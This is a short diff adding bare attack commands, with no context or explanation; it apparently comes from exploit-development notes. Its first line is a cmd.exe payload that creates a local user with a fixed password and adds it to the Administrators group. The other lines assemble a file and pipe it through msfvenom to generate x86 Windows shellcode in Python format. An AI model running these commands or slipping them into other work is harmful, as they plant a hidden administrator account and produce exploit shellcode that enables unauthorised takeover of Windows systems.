@@ -1,0 +1,4 @@
+cmd.exe /c "net user fiapusr @Pass123 /add && net localgroup administrators fiapusr /add"
+
+nasm notepad.asm -o notepad.o
+cat notepad.o | msfvenom -p - -a x86 --platform win -e generic/none -f python
